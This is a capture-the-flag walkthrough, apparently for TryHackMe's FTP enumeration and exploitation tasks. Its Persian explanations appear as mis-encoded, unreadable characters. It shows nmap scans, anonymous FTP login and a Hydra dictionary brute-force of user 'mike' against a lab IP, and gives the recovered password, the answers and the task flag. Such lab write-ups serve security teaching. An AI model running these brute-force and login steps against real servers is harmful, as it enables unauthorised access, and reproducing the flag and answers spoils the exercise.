	1. Ø¨Ø§ Ø§Ø³Ú©Ù† Ù‡Ø§ÛŒÛŒ Ú©Ù‡ Ø§Ù†Ø¬Ø§Ù… Ø¯Ø§Ø¯ÛŒÙ…ØŒ Ø¨Ù‡ØªØ±ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ÛŒ Ú©Ù‡ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² Ø¢Ù† Ø¨Ø±Ø§ÛŒ Ø¨Ù‡Ø±Ù‡ Ø¨Ø±Ø¯Ø§Ø±ÛŒ Ø®ÙˆØ¯ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…ØŒ Ø³Ø±ÙˆÛŒØ³ `vsftpd 2.0.8` Ù…ÛŒØ¨Ø§Ø´Ø¯ Ú©Ù‡ Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù‡Ù… Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù‡Ù…ÛŒÙ† Ø³Ø±ÙˆÛŒØ³ Ø­Ù…Ù„Ù‡ Ø®ÙˆØ¯ Ø±Ø§ Ù¾ÛŒØ§Ø¯Ù‡ Ø³Ø§Ø²ÛŒ Ù…ÛŒÚ©Ù†ÛŒÙ….
	2. Ù‡Ù…Ú†Ù†ÛŒÙ† Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² `FTP Anonymous Login` ØªÙˆØ§Ù†Ø³ØªÛŒÙ… Ø§Ø·Ù„Ø§Ø¹Ø§ØªÛŒ Ù…Ø§Ù†Ù†Ø¯ Username Ùˆ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø´Ø®ØµÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø¨Ø¯Ø³Øª Ø¨ÛŒØ§ÙˆØ±ÛŒÙ….
6. *TASK 9 Questions*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„*:
		1. What "variant" of FTP is running on it? `vsftp`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…*:
		1. Ù…ÛŒÚ¯ÙˆÛŒØ¯ Ø¨Ù‡ Ø³Ø±ÙˆØ± FTP Ø¯Ø±ÙˆÙ† 10.10.223.220 Ø¨Ø§ ÛŒÙˆØ²Ø± anonymous Ù„Ø§Ú¯ÛŒÙ† Ú©Ù†ÛŒØ¯ Ùˆ Ø³Ù¾Ø³ ÛŒÚ© ÙØ§ÛŒÙ„ Ø¯Ø±ÙˆÙ† Ø³Ø±ÙˆØ± Ø¨Ù†Ø§Ù… `PUBLIC_NOTICE.txt` Ø±Ø§ Ø¯Ø§Ù†Ù„ÙˆØ¯ Ú©Ù†ÛŒØ¯. Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù†Ø§Ù… Ø§ÛŒÙ† ÙØ§ÛŒÙ„ Ù¾Ø§Ø³Ø® Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ… Ø§Ø³Øª.
			1. ![[Pasted image 20240713165540.png]]
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…*:
		1. Ù…ÛŒÚ¯ÙˆÛŒØ¯ Ø¨Ù†Ø¸Ø± Ø´Ù…Ø§ Ù†Ø§Ù… Ø§ØµÙ„ÛŒ Username Ø§ÛŒÙ† Ù…Ø§Ø´ÛŒÙ† Ú†ÛŒØ³ØªØŸ Ú©Ø§ÙÛŒØ³Øª ÙØ§ÛŒÙ„ `PUBLIC_NOTICE.txt` Ø±Ø§ Ø¨Ø§Ø² Ú©Ù†ÛŒØ¯ØŒ Ø§ÛŒÙ† ÙØ§ÛŒÙ„ ÛŒÚ© Ù†Ø§Ù…Ù‡ Ø§Ø³Øª Ú©Ù‡ Ø¯Ø± Ø²ÛŒØ± Ù†Ø§Ù…Ù‡ ÛŒÚ© Ù†Ø§Ù… `Mike` ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯. Ø§ÛŒÙ† Ù†Ø§Ù… Ù…ÛŒØªÙˆØ§Ù†Ø¯ØŒ Ù†Ø§Ù… Ø§ØµÙ„ÛŒ ÛŒÙˆØ²Ø±Ù†ÛŒÙ… Ø¨Ø§Ø´Ø¯.
			1. ![[Pasted image 20240713165737.png]]
	4. Ø¨Ø± Ø±ÙˆÛŒ `Completed` Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯ ØªØ§ ÙˆØ§Ø±Ø¯ TASK 10 FTP Exploitation Ø´ÙˆÛŒÙ….
-----
```sh
sudo nmap -sS -A -T4 10.10.223.220
sudo nmap -sS 10.10.223.220
sudo nmap -p- 10.10.223.220

"FTP Anonymous Login"
ftp 10.10.223.220
Name(10.10.223.220:kali): anonymous
Password: #Leave it Blank
"Your now loging to ftp on 10.10.223.220"
ftp> ls
ftp> get PUBLIC_NOTICE.txt
ftp> exit
cd /home/kali/
cat PUBLIC_NOTICE.txt
```
##### TASK 10 - Exploitation FTP
0. *Task Description*
	1. Ø¯Ø± Ø§ÛŒÙ† Ù…Ø±Ø­Ù„Ù‡ Ù‡Ù… Ø¨Ø§ÛŒØ¯ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø³Ø±ÙˆÛŒØ³ Ø¢Ø³ÛŒØ¨ Ù¾Ø°ÛŒØ±ÛŒ Ú©Ù‡ Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¯Ø± Ù…Ø±Ø­Ù„Ù‡ Enumeration Ú©Ø´Ù Ú©Ø±Ø¯ÛŒÙ… Exploitation Ø®ÙˆØ¯ Ø±Ø§ Ø§Ù†Ø¬Ø§Ù… Ø¯Ù‡ÛŒÙ…. 
	2. Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù…ÛŒØ®ÙˆØ§Ù‡ÛŒÙ… *password* ÛŒÙˆØ²Ø± *mike* Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ø³Ø±ÙˆÛŒØ³ *FTP* Ø¯Ø± ÛŒÚ© Ø­Ù…Ù„Ù‡ *Bruteforce with Dictionary* Ø¨Ø¯Ø³Øª Ø¨ÛŒØ§ÙˆØ±ÛŒÙ…. Ø§ÛŒÙ† Ø­Ù…Ù„Ù‡ Ø±Ø§ Ø¨Ø§ Ø§Ø¨Ø²Ø§Ø± `Hydra` Ùˆ Ø¯ÛŒÚ©Ø´Ù†Ø±ÛŒ `Rockyou` Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ¯Ù‡ÛŒÙ….
1. *Initializing Attack*
	1. Ø¢Ù…Ø§Ø¯Ù‡ Ø³Ø§Ø²ÛŒ `rockyou.txt` Ùˆ Ø§Ù†Ø¬Ø§Ù… Ø­Ù…Ù„Ù‡ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø¢Ù†
	3. `hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.223.220 ftp -v`
	4. Ø¨Ù‡ Ù…Ø­Ø¶ Ø´Ø±ÙˆØ¹ Ø­Ù…Ù„Ù‡ Ùˆ Ù¾ÛŒØ¯Ø§ Ø´Ø¯Ù† Ù¾Ø³ÙˆØ±Ø¯ ÛŒÙˆØ²Ø± mikeØŒ Ø§Ø¨Ø²Ø§Ø± Ø¢Ù†Ø±Ø§ Ø¯Ø± ØµÙØ­Ù‡ ØªØ±Ù…ÛŒÙ†Ø§Ù„ Ù†Ù…Ø§ÛŒØ´ Ù…ÛŒØ¯Ù‡Ø¯:
		1. ![[Pasted image 20240713171311.png]]
	5. Ø­Ø§Ù„ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ø§ ÛŒÙˆØ²Ø± mike Ùˆ Ù¾Ø³ÙˆØ±Ø¯ password Ø¨Ù‡ FTP Server Ø¯Ø±ÙˆÙ† 10.10.223.220 Ù„Ø§Ú¯ÛŒÙ† Ú©Ù†ÛŒÙ….
		1. `ftp 10.10.223.220`
		2. `Name: mike`
		3. `Password: password`
			1. ![[Pasted image 20240713171636.png]]
		4. `ftp> ls`
	6. ÙØ§ÛŒÙ„ÛŒ Ø¯Ø±ÙˆÙ† Ø³Ø±ÙˆØ± Ø¨Ù†Ø§Ù… `ftp.txt` ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯ Ú©Ù‡ Ø¨Ø§ÛŒØ¯ Ø¨Ø±Ø§ÛŒ Ø¬ÙˆØ§Ø¨ Ø¯Ø§Ø¯Ù† Ø³ÙˆØ§Ù„ Ø¢Ù†Ø±Ø§ Ø¯Ø§Ù†Ù„ÙˆØ¯ Ú©Ù†ÛŒÙ…:
		1. `ftp> ls`
		2. `ftp> get ftp.txt`
			1. ![[Pasted image 20240713171859.png]]
		3. `ftp> exit`
	7. Ø­Ø§Ù„ Ú©Ø§ÙÛŒØ³Øª `ftp.txt` ÙØ§ÛŒÙ„ Ø±Ø§ Ø¨Ø§Ø² Ú©Ù†ÛŒÙ… Ùˆ Ù…Ù‚Ø¯Ø§Ø± ÙÙ„Ú¯ØŒ Ú©Ù‡ Ø¬ÙˆØ§Ø¨ Ø³ÙˆØ§Ù„ Ø³ÙˆÙ… Ø§Ø³Øª Ø±Ø§ Ú©Ù¾ÛŒ Ú©Ù†ÛŒÙ…:
		1. `cat ~/ftp.txt`
			1. ![[Pasted image 20240713172027.png]]
2. *TASK 10 Q_&_A*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„* Ù¾Ø³ÙˆØ±Ø¯ ÛŒÙˆØ²Ø±Ù†ÛŒÙ… Mike Ú†ÛŒØ³ØªØŸ `password`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…* ÙÙ‚Ø· Ú©Ø§ÙÛŒØ³Øª Ø¨Ø§ ÛŒÙˆØ²Ø± Ù†ÛŒÙ… Mike Ø¨Ù‡ FTP Server Ø¯Ø±ÙˆÙ† Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ù…ØªØµÙ„ Ø´ÙˆÛŒÙ…. Ø³Ù¾Ø³ Ø¨Ø± Ø±ÙˆÛŒ `Completed` Ú©Ù„ÛŒÚ© Ù…ÛŒÚ©Ù†ÛŒÙ….
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…* ÙØ§ÛŒÙ„ `ftp.txt` Ø±Ø§ Ø§Ø² FTP Server Ø¯Ø±ÙˆÙ† 10.10.223.220 Ø¯Ø§Ù†Ù„ÙˆØ¯ Ú©Ù†ÛŒØ¯ØŒ Ø³Ù¾Ø³ Ø¢Ù†Ø±Ø§ Ø¨Ø§Ø² Ú©Ù†ÛŒØ¯ØŒ Ú©Ø§ÙÛŒØ³Øª Ù…Ù‚Ø¯Ø§Ø± ÙÙ„Ú¯ Ø±Ø§ Ú©Ù¾ÛŒ Ùˆ Ø¯Ø± Ø¬ÙˆØ§Ø¨ Ø§ÛŒÙ† Ø³ÙˆØ§Ù„ paste Ú©Ù†ÛŒÙ…. `THM{y0o_g0t_th3_ftp_fl4g}`
		1. ![[Pasted image 20240713172353.png]]
----
```sh
hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.223.220 ftp -v
ftp 10.10.223.220
Name(10.10.223.220:kali): mike
Password: password
ftp> ls
ftp> get ftp.txt
ftp> exit
cat ~/ftp.txt #Copy flag value => THM{y0o_g0t_th3_ftp_fl4g
```
### !